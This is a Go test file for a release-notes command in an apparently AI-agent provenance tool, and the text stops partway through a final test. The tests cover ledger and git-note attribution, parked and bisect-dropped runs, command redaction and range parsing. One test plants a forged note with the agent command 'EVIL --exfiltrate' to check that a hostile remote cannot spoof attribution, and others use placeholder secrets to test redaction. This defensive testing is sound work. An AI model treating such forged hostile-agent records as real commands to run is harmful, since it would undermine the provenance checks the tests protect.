package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io/fs"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/surya-koritala/sigbound/internal/gitx"
)

// releaseDay is the fixed committer date of the n-th fixture commit. Fixed, not
// time.Now(), because the whole attention-item window is derived from committer
// dates: a fixture that drifted with the wall clock would make every windowed
// assertion below depend on when the suite ran.
func releaseDay(n int) time.Time { return time.Date(2026, 3, 1+n, 12, 0, 0, 0, time.UTC) }

// releaseRunID mints a run id with the timestamp prefix newRunID uses, so a run
// dir can be placed INSIDE or OUTSIDE the fixture's committer-date window on
// purpose.
func releaseRunID(at time.Time, suffix string) string {
	return at.UTC().Format(runIDTimeLayout) + "-" + suffix
}

// releaseCommit writes one file and commits it with a pinned committer date.
func releaseCommit(t *testing.T, repo, file, content string, at time.Time) string {
	t.Helper()
	if err := os.WriteFile(filepath.Join(repo, file), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{
		{"add", "-A"},
		{"commit", "-q", "--no-gpg-sign", "-m", file},
	} {
		cmd := exec.Command("git", append([]string{"-C", repo}, args...)...)
		cmd.Env = gcHermeticEnv(at)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v: %s", args, err, out)
		}
	}
	sha, err := gitx.New(repo).RevParse(context.Background(), "HEAD")
	if err != nil {
		t.Fatal(err)
	}
	return sha
}

// releaseRepo builds a repo whose main branch is four commits dated day 0..3.
// Returns the Git handle, the repo path, and the shas oldest-first, so a test
// can name a range (shas[0]..shas[3] holds three commits) and a window
// ([day 0, day 3]) without guessing.
func releaseRepo(t *testing.T) (*gitx.Git, string, []string) {
	t.Helper()
	dir := t.TempDir()
	g := gitx.New(dir)
	if err := g.Init(context.Background()); err != nil {
		t.Fatal(err)
	}
	shas := make([]string, 0, 4)
	for i := 0; i < 4; i++ {
		shas = append(shas, releaseCommit(t, dir, fmt.Sprintf("f%d.txt", i), "x\n", releaseDay(i)))
	}
	return g, dir, shas
}

// releaseJSON runs `sig log -release <spec> -json` and decodes the document.
func releaseJSON(t *testing.T, repo, spec string, extra ...string) (*releaseDoc, string) {
	t.Helper()
	var buf bytes.Buffer
	argv := append([]string{"-repo", repo, "-release", spec, "-json"}, extra...)
	code, err := runLog(&buf, argv)
	if err != nil || code != exitOK {
		t.Fatalf("runLog -release %s: code=%d err=%v\n%s", spec, code, err, buf.String())
	}
	var doc releaseDoc
	if err := json.Unmarshal(buf.Bytes(), &doc); err != nil {
		t.Fatalf("decode release doc: %v\n%s", err, buf.String())
	}
	return &doc, buf.String()
}

// releaseMarkdown runs `sig log -release <spec>` and returns the document.
func releaseMarkdown(t *testing.T, repo, spec string, extra ...string) string {
	t.Helper()
	var buf bytes.Buffer
	argv := append([]string{"-repo", repo, "-release", spec}, extra...)
	code, err := runLog(&buf, argv)
	if err != nil || code != exitOK {
		t.Fatalf("runLog -release %s: code=%d err=%v\n%s", spec, code, err, buf.String())
	}
	return buf.String()
}

// --- AC #1: a repo with no ledger and no notes still renders a true document ---

func TestReleaseNoRunsNoNotes(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	spec := shas[0] + ".." + shas[3]

	want, err := exec.Command("git", "-C", repo, "rev-list", "--count", shas[0]+".."+shas[3]).Output()
	if err != nil {
		t.Fatal(err)
	}
	doc, _ := releaseJSON(t, repo, spec)
	if got := fmt.Sprintf("%d\n", doc.Commits); got != string(want) {
		t.Fatalf("commits = %s, want %s (git rev-list --count)", got, want)
	}
	if len(doc.Landings) != 0 {
		t.Fatalf("landings = %+v, want none", doc.Landings)
	}
	if doc.Unattributed != doc.Commits {
		t.Fatalf("unattributed = %d, want %d — every commit is unclaimed here", doc.Unattributed, doc.Commits)
	}
	// The window is the endpoints' committer dates, printed because it is an
	// approximation the reader has to be able to see.
	if doc.Window.Start != releaseDay(0).Format(time.RFC3339) || doc.Window.End != releaseDay(3).Format(time.RFC3339) {
		t.Fatalf("window = %+v, want the endpoints' committer dates", doc.Window)
	}
	md := releaseMarkdown(t, repo, spec)
	if !strings.Contains(md, "carry no sigbound landing") {
		t.Fatalf("markdown does not disclose the unattributed commits:\n%s", md)
	}
	_ = g
}

// TestReleaseEmptyRangeIsAClearMessage: TO an ancestor of FROM is exit 0 and a
// document that SAYS it is empty — never an empty file for a human to interpret.
func TestReleaseEmptyRangeIsAClearMessage(t *testing.T) {
	_, repo, shas := releaseRepo(t)
	spec := shas[3] + ".." + shas[0]

	doc, raw := releaseJSON(t, repo, spec)
	if doc.Commits != 0 || len(doc.Landings) != 0 {
		t.Fatalf("empty range rendered %d commits / %d landings", doc.Commits, len(doc.Landings))
	}
	if doc.FromSHA != shas[3] || doc.ToSHA != shas[0] {
		t.Fatalf("empty range lost its endpoints: %+v", doc)
	}
	if strings.TrimSpace(raw) == "" {
		t.Fatal("-json emitted nothing for an empty range")
	}
	md := releaseMarkdown(t, repo, spec)
	if !strings.Contains(md, "No commits in") {
		t.Fatalf("empty-range markdown is not a clear message:\n%q", md)
	}
}

// --- AC #2 / #16: a ledger landing renders with the stable field names ---

func TestReleaseLedgerLanding(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
		Strategy: "overlay", AgentCmd: "claude -p", Source: "watch", Intent: "billing-rates",
		Tasks:    []taskSpec{{ID: "t1"}, {ID: "t2"}},
		PerAgent: []perAgentJSON{{ID: "t1", Branch: "agent/t1", SHA: hexSHA("a1"), OK: true}},
		Integrate: integrateJSON{
			Strategy: "overlay", Landed: []string{"agent/t1", "agent/t2"}, FinalSHA: shas[2],
		},
		Verify: verifyJSON{Ran: true, OK: true, Repaired: true},
		Policy: &policyJSON{Hash: "9f2c" + strings.Repeat("0", 60), Verify: []string{"go test ./...", "go vet ./..."}},
	})

	doc, raw := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 1 {
		t.Fatalf("landings = %d, want exactly 1\n%s", len(doc.Landings), raw)
	}
	l := doc.Landings[0]
	if l.RunID != id || l.LandedSHA != short(shas[2]) || l.Strategy != "overlay" || l.Members != 2 || l.Verify != "pass" {
		t.Fatalf("landing = %+v", l)
	}
	if l.ProvenanceSource != "manifest" || l.Source != "watch" {
		t.Fatalf("landing source = %q/%q, want manifest/watch", l.ProvenanceSource, l.Source)
	}
	// An intent-sourced landing carries its intent — the handle that ties a
	// released commit back to the work the repo asked for.
	if l.Intent != "billing-rates" {
		t.Fatalf("intent = %q, want billing-rates", l.Intent)
	}
	if !reflect.DeepEqual(l.Tasks, []string{"t1", "t2"}) {
		t.Fatalf("tasks = %v", l.Tasks)
	}
	if !reflect.DeepEqual(l.Acceptance, []string{"go test ./...", "go vet ./..."}) {
		t.Fatalf("acceptance = %v, want the policy's own verify lines", l.Acceptance)
	}
	if l.VerifyDetail == nil || !l.VerifyDetail.Repaired {
		t.Fatalf("verifyDetail = %+v, want repaired", l.VerifyDetail)
	}
	if doc.Unattributed != doc.Commits-1 {
		t.Fatalf("unattributed = %d with %d commits and one landing", doc.Unattributed, doc.Commits)
	}

	// Field names shared with `sig log -json` and the run report.
	var obj map[string]json.RawMessage
	if err := json.Unmarshal([]byte(raw), &obj); err != nil {
		t.Fatal(err)
	}
	for _, k := range []string{"from", "fromSHA", "to", "toSHA", "commits", "window", "landings", "agents", "policy", "unattributed", "incomplete", "withCommands"} {
		if _, ok := obj[k]; !ok {
			t.Fatalf("top-level field %q missing from -json", k)
		}
	}
	var landings []map[string]json.RawMessage
	if err := json.Unmarshal(obj["landings"], &landings); err != nil {
		t.Fatal(err)
	}
	for _, k := range []string{"runId", "startedAt", "source", "intent", "landedSHA", "members", "strategy", "verify", "acceptance", "agent", "policyHash", "provenanceSource"} {
		if _, ok := landings[0][k]; !ok {
			t.Fatalf("landing field %q missing from -json: %v", k, keysOf(landings[0]))
		}
	}
	if _, ok := landings[0]["commands"]; ok {
		t.Fatal("commands present without -with-commands")
	}

	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	for _, want := range []string{"### Landed", "### Attribution", "### Policy", short(shas[2]), "intent: billing-rates", "go test ./..."} {
		if !strings.Contains(md, want) {
			t.Fatalf("markdown missing %q:\n%s", want, md)
		}
	}
	if strings.Contains(md, "\n# ") {
		t.Fatalf("markdown carries a document title; it must paste under an existing heading:\n%s", md)
	}
}

// TestReleaseUnlandedRunIsNotALanding: a run whose member commit is in the range
// but which never landed (verify red) attributes NOTHING — the commit reached
// the range some other way, and claiming it would be a lie the document publishes.
func TestReleaseUnlandedRunIsNotALanding(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "bbbb")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
		Strategy: "overlay", AgentCmd: "claude -p",
		PerAgent:  []perAgentJSON{{ID: "t1", Branch: "agent/t1", SHA: shas[2], OK: true}},
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[3]},
		Verify:    verifyJSON{Ran: true, OK: false}, // red: nothing landed
	})

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 0 {
		t.Fatalf("a red run produced %d landing(s): %+v", len(doc.Landings), doc.Landings)
	}
	if doc.Unattributed != doc.Commits {
		t.Fatalf("unattributed = %d, want %d", doc.Unattributed, doc.Commits)
	}
}

// --- AC #3: a gc'd run still renders from its portable landing note ---

func TestReleaseNoteOnlyAfterLedgerIsGone(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	ctx := context.Background()
	id := releaseRunID(releaseDay(2), "cccc")
	hash := "b9b8" + strings.Repeat("0", 60)
	rep := runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
		Strategy: "overlay", AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
		Policy:    &policyJSON{Hash: hash, Verify: []string{"go test ./..."}},
	}
	writeLogRun(t, runsDir, id, rep)
	data, err := json.MarshalIndent(rep, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := g.NoteAdd(ctx, "sigbound", shas[2], data); err != nil {
		t.Fatal(err)
	}

	fromLedger, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(fromLedger.Landings) != 1 || fromLedger.Landings[0].ProvenanceSource != "manifest" {
		t.Fatalf("with a run dir present the landing must come from the ledger: %+v", fromLedger.Landings)
	}

	// gc the run history: only the note survives.
	if err := os.RemoveAll(filepath.Join(runsDir, id)); err != nil {
		t.Fatal(err)
	}
	fromNote, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(fromNote.Landings) != 1 {
		t.Fatalf("landings after gc = %d, want 1 (the note is portable)", len(fromNote.Landings))
	}
	l := fromNote.Landings[0]
	if l.ProvenanceSource != "note" || l.RunID != id || l.LandedSHA != short(shas[2]) {
		t.Fatalf("note-sourced landing = %+v", l)
	}
	if fromNote.Unattributed != fromLedger.Unattributed {
		t.Fatalf("unattributed changed when the ledger was gc'd: %d -> %d", fromLedger.Unattributed, fromNote.Unattributed)
	}
	// A document must not contradict itself: a landing that names an agent has to
	// appear in the attribution table too. But the note is user-writable, so its
	// row is its OWN, marked unverified — never merged into the ledger's count.
	if len(fromNote.Agents) != 1 || fromNote.Agents[0].Agent != "claude" || !fromNote.Agents[0].Unverified {
		t.Fatalf("attribution = %+v, want one unverified claude row (ledger had %+v)", fromNote.Agents, fromLedger.Agents)
	}
	if fromLedger.Agents[0].Unverified {
		t.Fatalf("a ledger-derived attribution row is marked unverified: %+v", fromLedger.Agents)
	}
	// The policy rollup is repo-derived: with the ledger gone, the hash the NOTE
	// claims is not a hash this document will republish.
	if fromLedger.Policy.Hashes[0].Hash != hash {
		t.Fatalf("the ledger's own policy hash went missing: %+v", fromLedger.Policy)
	}
	if len(fromNote.Policy.Hashes) != 0 || fromNote.Policy.Changed {
		t.Fatalf("policy rollup took a hash from a commit note: %+v", fromNote.Policy)
	}
	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	if !strings.Contains(md, "No run in this range recorded") {
		t.Fatalf("markdown reports a policy nothing in the repo recorded:\n%s", md)
	}
}

// --- AC #4: a note about some other commit is not attribution ---

func TestReleaseForgedNoteIsUnattributed(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	ctx := context.Background()
	// A note ON a range commit whose payload is about a DIFFERENT final commit,
	// with a fabricated agent — the shape a hostile remote can push.
	forged := runReport{
		RunID: "20260101T000000Z-evil", BaseSHA: hexSHA("00"), Strategy: "overlay", AgentCmd: "EVIL --exfiltrate",
		PerAgent:  []perAgentJSON{{ID: "x1", Branch: "agent/x1", SHA: hexSHA("11"), OK: true}},
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/x1"}, FinalSHA: hexSHA("dead")},
		Verify:    verifyJSON{Ran: true, OK: true},
	}
	data, err := json.MarshalIndent(forged, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := g.NoteAdd(ctx, "sigbound", shas[2], data); err != nil {
		t.Fatal(err)
	}

	doc, raw := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 0 {
		t.Fatalf("a forged note produced a landing: %+v", doc.Landings)
	}
	if doc.Unattributed != doc.Commits {
		t.Fatalf("unattributed = %d, want %d — the forged commit must count as unclaimed", doc.Unattributed, doc.Commits)
	}
	if strings.Contains(raw, "EVIL") {
		t.Fatalf("the forged note's agent reached the published document:\n%s", raw)
	}
}

// --- AC #5: a parked run is listed, and rendering it transitions nothing ---

// writeReleasePark writes a valid park.json + awaiting-ack status.json into a run
// dir. createdAt is deliberately a parameter: a park whose ack-timeout has
// already expired is what makes the "no lazy sweep" assertion below meaningful —
// if buildRelease swept, THIS record is the one it would rewrite.
func writeReleasePark(t *testing.T, dir string, createdAt time.Time) {
	t.Helper()
	pk := &parkJSON{
		VerifiedSHA: hexSHA("ab"), VerifiedTree: hexSHA("cd"), BaseSHA: hexSHA("ef"), ForkSHA: hexSHA("12"),
		Base: "main", Reason: parkReasonAckPaths, CreatedAt: createdAt.UTC().Format(time.RFC3339),
		AckTimeout: "1h", AckTimeoutAction: parkActionReject,
		Groups: []parkGroupJSON{{
			Branches:     []string{"agent/t7"},
			MatchedPaths: map[string]string{"billing/rates.go": "billing/**"},
			Reason:       parkReasonAckPaths,
		}},
		Attempts: []parkAttemptJSON{{N: 1, At: createdAt.UTC().Format(time.RFC3339), VerifyOK: true}},
	}
	if err := writePark(dir, pk); err != nil {
		t.Fatal(err)
	}
	writeRunStatus(dir, statusAwaitingAck, "parked for ack")
}

func TestReleaseParkedListedAndNotSwept(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "dddd")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
		Strategy: "overlay", AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay"},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	dir := filepath.Join(runsDir, id)
	writeReleasePark(t, dir, time.Now().Add(-2*time.Hour)) // already past its 1h deadline

	before := readFileOrFail(t, filepath.Join(dir, parkFileName))
	statusBefore := readFileOrFail(t, filepath.Join(dir, "status.json"))

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Parked) != 1 {
		t.Fatalf("parked = %+v, want the one awaiting-ack run", doc.Parked)
	}
	p := doc.Parked[0]
	if p.RunID != id || p.Status != statusAwaitingAck || p.Reason != parkReasonAckPaths {
		t.Fatalf("parked entry = %+v", p)
	}
	if !reflect.DeepEqual(p.Branches, []string{"agent/t7"}) {
		t.Fatalf("parked branches = %v", p.Branches)
	}
	if p.MatchedPaths["billing/rates.go"] != "billing/**" {
		t.Fatalf("matched paths = %v", p.MatchedPaths)
	}
	if p.ExpiresAt == "" || p.Attempts != 1 {
		t.Fatalf("parked entry lost its deadline/attempts: %+v", p)
	}

	// The read-only claim, at the one place it is easiest to break: generating a
	// document must never transition a run's state, so the EXPIRED park must
	// still be awaiting-ack with byte-identical records.
	if got := readFileOrFail(t, filepath.Join(dir, parkFileName)); !bytes.Equal(got, before) {
		t.Fatalf("park.json changed:\nbefore %s\nafter  %s", before, got)
	}
	if got := readFileOrFail(t, filepath.Join(dir, "status.json")); !bytes.Equal(got, statusBefore) {
		t.Fatalf("status.json changed: the ack-timeout sweep ran during a read-only render\n%s", got)
	}
	if st, _ := diskRunStatus(dir); st != statusAwaitingAck {
		t.Fatalf("run status = %q after rendering, want %s", st, statusAwaitingAck)
	}

	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	if !strings.Contains(md, "### Needed a human") || !strings.Contains(md, "billing/rates.go") {
		t.Fatalf("markdown does not surface the park:\n%s", md)
	}
}

// TestReleaseUnreadableParkIsListed: a park.json that will not validate is still
// something a human is owed — it is listed as unreadable, never dropped.
func TestReleaseUnreadableParkIsListed(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "eeee")
	writeLogRun(t, runsDir, id, runReport{RunID: id, BaseSHA: shas[1], Integrate: integrateJSON{}})
	dir := filepath.Join(runsDir, id)
	if err := os.WriteFile(filepath.Join(dir, parkFileName), []byte("{ truncated"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeRunStatus(dir, statusAwaitingAck, "parked")

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Parked) != 1 || doc.Parked[0].Reason != "unreadable" || doc.Parked[0].Error == "" {
		t.Fatalf("parked = %+v, want one unreadable entry carrying the error", doc.Parked)
	}
}

// --- AC #6: a bisect run appears in landings once AND in dropped ---

func TestReleaseBisectDroppedAndSalvaged(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "ffff")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
		Strategy: "overlay", AgentCmd: "aider",
		PerAgent: []perAgentJSON{
			{ID: "keep", Branch: "agent/keep", SHA: shas[3], OK: true},
			// The DROPPED member's commit is in the range too — it reached it some
			// other way. Only the landed half may be attributed, which is what the
			// `landed` membership test in landedCommitsIn is for.
			{ID: "drop", Branch: "agent/drop", SHA: shas[1], OK: true},
		},
		Integrate: integrateJSON{
			Strategy: "overlay", Landed: []string{"agent/keep"},
			DroppedByBisect: []string{"agent/drop"}, FinalSHA: shas[2],
		},
		Verify: verifyJSON{Ran: true, OK: true, Bisect: &bisectJSON{Ran: true, Attempts: 3}},
	})

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 1 {
		t.Fatalf("landings = %d, want the salvaged subset exactly once: %+v", len(doc.Landings), doc.Landings)
	}
	if len(doc.Dropped) != 1 || doc.Dropped[0].RunID != id || doc.Dropped[0].Attempts != 3 {
		t.Fatalf("dropped = %+v", doc.Dropped)
	}
	if !reflect.DeepEqual(doc.Dropped[0].Branches, []string{"agent/drop"}) {
		t.Fatalf("dropped branches = %v", doc.Dropped[0].Branches)
	}
	// Both the integration commit and the landed member are in the range; the run
	// still contributes ONE landing row.
	if doc.Unattributed != doc.Commits-2 {
		t.Fatalf("unattributed = %d with %d commits; both claimed commits must be attributed", doc.Unattributed, doc.Commits)
	}
	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	if !strings.Contains(md, "### Dropped by bisect") {
		t.Fatalf("markdown missing the bisect section:\n%s", md)
	}
}

// --- AC #7: commands are absent by default, opt-in and flagged with -with-commands ---

func TestReleaseRedactsCommandsByDefault(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "9999")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
		Strategy: "overlay", AgentCmd: "/usr/local/bin/claude -p",
		VerifyCmd: "API_KEY=SECRET-TOKEN go test ./...", RepairCmd: "fix --key SECRET-TOKEN",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	spec := shas[0] + ".." + shas[3]

	for _, out := range []string{releaseMarkdown(t, repo, spec), mustReleaseRaw(t, repo, spec)} {
		if strings.Contains(out, "SECRET-TOKEN") {
			t.Fatalf("a recorded command reached the default output:\n%s", out)
		}
	}
	doc, _ := releaseJSON(t, repo, spec)
	if doc.WithCommands || doc.Landings[0].Commands != nil {
		t.Fatalf("commands present by default: %+v", doc.Landings[0])
	}
	if doc.Landings[0].Agent != "claude" {
		t.Fatalf("agent = %q, want the program name", doc.Landings[0].Agent)
	}

	withMD := releaseMarkdown(t, repo, spec, "-with-commands")
	if !strings.Contains(withMD, "SECRET-TOKEN") {
		t.Fatalf("-with-commands did not include the verbatim command:\n%s", withMD)
	}
	if !strings.Contains(withMD, "> commands are included verbatim and may contain secrets") {
		t.Fatalf("-with-commands markdown carries no warning line:\n%s", withMD)
	}
	withDoc, withRaw := releaseJSON(t, repo, spec, "-with-commands")
	if !withDoc.WithCommands || withDoc.Landings[0].Commands == nil {
		t.Fatalf("-with-commands JSON did not set withCommands/commands: %+v", withDoc.Landings[0])
	}
	if !strings.Contains(withRaw, "SECRET-TOKEN") {
		t.Fatalf("-with-commands JSON dropped the command:\n%s", withRaw)
	}
}

// mustReleaseRaw returns the raw -json bytes (for a substring check that must
// not depend on decoding).
func mustReleaseRaw(t *testing.T, repo, spec string) string {
	t.Helper()
	_, raw := releaseJSON(t, repo, spec)
	return raw
}

// TestAgentNameCollapsesToProgram is agentName's own contract: a program name,
// never an argument, and never an env assignment that could carry a key.
func TestAgentNameCollapsesToProgram(t *testing.T) {
	cases := map[string]string{
		"/usr/local/bin/claude -p":    "claude",
		"claude -p --model x":         "claude",
		`C:\tools\codex.exe exec`:     "codex.exe",
		"":                            "unknown",
		"   ":                         "unknown",
		"API_KEY=sk-secret claude -p": "unknown",
		"aider":                       "aider",
	}
	for cmd, want := range cases {
		if got := agentName(cmd); got != want {
			t.Fatalf("agentName(%q) = %q, want %q", cmd, got, want)
		}
	}
}

// --- AC #8: attribution collapses to one row per agent program ---

func TestReleaseAgentsCollapseByProgram(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	writeLogRun(t, runsDir, releaseRunID(releaseDay(1), "aa"), runReport{
		BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "/usr/local/bin/claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[1]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	writeLogRun(t, runsDir, releaseRunID(releaseDay(2), "bb"), runReport{
		BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude -p --model x",
		Integrate: integrateJSON{Strategy: "overlay"}, // ran in the window, landed nothing
		Verify:    verifyJSON{Ran: true, OK: false},
	})

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Agents) != 1 {
		t.Fatalf("agents = %+v, want one row", doc.Agents)
	}
	if doc.Agents[0] != (releaseAgent{Agent: "claude", Runs: 2, Landed: 1}) {
		t.Fatalf("agent row = %+v, want {claude 2 1}", doc.Agents[0])
	}
}

// --- AC #9: the policy section answers "did the landing bar move" ---

func TestReleasePolicyChangeInsideRange(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	first, second := releaseRunID(releaseDay(1), "aa"), releaseRunID(releaseDay(2), "bb")
	hashA, hashB := "3ab1"+strings.Repeat("0", 60), "9f2c"+strings.Repeat("0", 60)
	writeLogRun(t, runsDir, first, runReport{
		BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"a"}, FinalSHA: shas[1]},
		Verify:    verifyJSON{Ran: true, OK: true}, Policy: &policyJSON{Hash: hashA},
	})
	writeLogRun(t, runsDir, second, runReport{
		BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"a"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true}, Policy: &policyJSON{Hash: hashB},
	})

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if !doc.Policy.Changed || len(doc.Policy.Hashes) != 2 {
		t.Fatalf("policy = %+v, want changed with both hashes", doc.Policy)
	}
	if doc.Policy.Hashes[0].Hash != hashA || doc.Policy.Hashes[0].FirstRunID != first {
		t.Fatalf("first hash = %+v, want %s from %s", doc.Policy.Hashes[0], hashA, first)
	}
	if doc.Policy.Hashes[1].FirstRunID != second {
		t.Fatalf("second hash = %+v, want first seen in %s", doc.Policy.Hashes[1], second)
	}
	if !strings.Contains(releaseMarkdown(t, repo, shas[0]+".."+shas[3]), "CHANGED inside this range") {
		t.Fatal("markdown does not report the policy change")
	}

	// The same hash twice is not a change.
	writeLogRun(t, runsDir, second, runReport{
		BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"a"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true}, Policy: &policyJSON{Hash: hashA},
	})
	same, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if same.Policy.Changed || len(same.Policy.Hashes) != 1 {
		t.Fatalf("policy = %+v, want unchanged with one hash", same.Policy)
	}
}

// TestReleasePolicyHashReachesSigLog is the one-line fix this change carries:
// `sig log`'s policyHash column read a TOP-LEVEL policyHash key that nothing has
// ever written (policyReport writes policy.hash), so it was permanently empty.
func TestReleasePolicyHashReachesSigLog(t *testing.T) {
	g, repo, _ := newGCRepo(t)
	runsDir := logRunsDir(t, g)
	hash := "3ab1" + strings.Repeat("0", 60)
	writeLogRun(t, runsDir, "20260301T000000Z-aaaa", runReport{
		BaseSHA: hexSHA("00"), Integrate: integrateJSON{Strategy: "overlay"},
		Policy: &policyJSON{Hash: hash, Verify: []string{"go test ./..."}},
	})
	rows, _ := scanRuns(runsDir, 0)
	if len(rows) != 1 || rows[0].PolicyHash != hash {
		t.Fatalf("logRow.PolicyHash = %q, want %q", rows[0].PolicyHash, hash)
	}
	var buf bytes.Buffer
	if code, err := runLog(&buf, []string{"-repo", repo, "-json"}); err != nil || code != exitOK {
		t.Fatalf("runLog: code=%d err=%v", code, err)
	}
	if !strings.Contains(buf.String(), hash) {
		t.Fatalf("policyHash absent from `sig log -json`:\n%s", buf.String())
	}
}

// --- AC #10 / #11: the selector is exclusive and the grammar is refused, not guessed ---

func TestReleaseSelectorsMutuallyExclusive(t *testing.T) {
	_, repo, shas := releaseRepo(t)
	for _, argv := range [][]string{
		{"-repo", repo, "-release", shas[0] + ".." + shas[3], "-sha", hexSHA("a1")},
		{"-repo", repo, "-release", shas[0] + ".." + shas[3], "-task", "t1"},
	} {
		var buf bytes.Buffer
		code, err := runLog(&buf, argv)
		if err == nil || code != exitOperationalError {
			t.Fatalf("%v: code=%d err=%v, want a mutual-exclusion error", argv, code, err)
		}
		if buf.Len() != 0 {
			t.Fatalf("%v wrote to stdout on a usage error: %q", argv, buf.String())
		}
	}
}

func TestReleaseMalformedRangeRefused(t *testing.T) {
	_, repo, shas := releaseRepo(t)
	for _, spec := range []string{
		shas[0],                   // a bare rev
		".." + shas[3],            // implicit FROM
		shas[0] + "..",            // implicit TO
		shas[0] + "..." + shas[3], // symmetric difference
		shas[0] + ".." + shas[1] + ".." + shas[3], // three endpoints
		"..",
		"-HEAD..HEAD", // an option-shaped revision
	} {
		var buf bytes.Buffer
		code, err := runLog(&buf, []string{"-repo", repo, "-release", spec})
		if err == nil || code != exitOperationalError {
			t.Fatalf("-release %q: code=%d err=%v, want exit 1", spec, code, err)
		}
		if !strings.Contains(err.Error(), "FROM..TO") {
			t.Fatalf("-release %q error %q does not name the expected form", spec, err)
		}
		if buf.Len() != 0 {
			t.Fatalf("-release %q wrote a partial document: %q", spec, buf.String())
		}
	}
}

func TestReleaseUnresolvableEndpointIsRefused(t *testing.T) {
	_, repo, shas := releaseRepo(t)
	var buf bytes.Buffer
	code, err := runLog(&buf, []string{"-repo", repo, "-release", "v9.9.9-nope.." + shas[3]})
	if err == nil || code != exitOperationalError {
		t.Fatalf("code=%d err=%v, want exit 1 for an unresolvable endpoint", code, err)
	}
	if buf.Len() != 0 {
		t.Fatalf("a half-rendered document reached stdout: %q", buf.String())
	}
}

// --- AC #12: the serve mirror is the same builder ---

func TestReleaseServeMatchesCLI(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
		Strategy: "overlay", AgentCmd: "claude -p",
